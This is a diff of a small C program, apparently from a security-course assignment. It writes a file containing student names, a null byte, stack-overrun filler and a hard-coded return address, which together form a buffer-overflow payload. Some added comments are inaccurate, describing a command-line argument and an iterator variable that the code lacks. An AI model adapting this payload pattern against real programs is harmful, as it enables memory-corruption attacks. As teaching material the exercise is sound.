@@ -10,26 +10,34 @@
 /*--------------------------------------------------------------------*/
 
 #include <stdio.h>
-#include <string.h>
 
+/* Accepts a string of characters as a command-line argument. Writes
+   the string of characters to the dataB file. Returns 0. */
 int main(void) {
+
+   /* create a file pointer and iterator variable */
    FILE *dataB;
-   dataB = fopen("dataB", "wb");
 
-   const char name[] = "Alex Delisthathis & Matthew Zhang";
-   fwrite(name, sizeof(char), strlen(name), dataB);
+   /* open the file */
+   dataB = fopen("dataB", "w+");
 
-   const int paddingSize = 48 - strlen(name);
+   /* write names to file */ 
+   fprintf(dataB, "Alex Delistathis & Matthew Zhang");
 
-   for (int i = 0; i < paddingSize; i++) {
-      fputc('A', dataB); 
-   }
+   /* write null byte to file */
+   putc('\0', dataB);
+   
+   /* overrun the stack */
+   fprintf(dataB, "%s", "angangangangang");
 
-   putc(0x90, dataB);  
-   putc(0x08, dataB); 
-   putc(0x40, dataB);  
-
+   /* write target address to file */
+   fprintf(dataB, "%c", 0x90);
+   fprintf(dataB, "%c", 0x08);
+   fprintf(dataB, "%c", 0x40);
+   
+   /* close file */
    fclose(dataB);
+
    return 0;
 }
-
+   
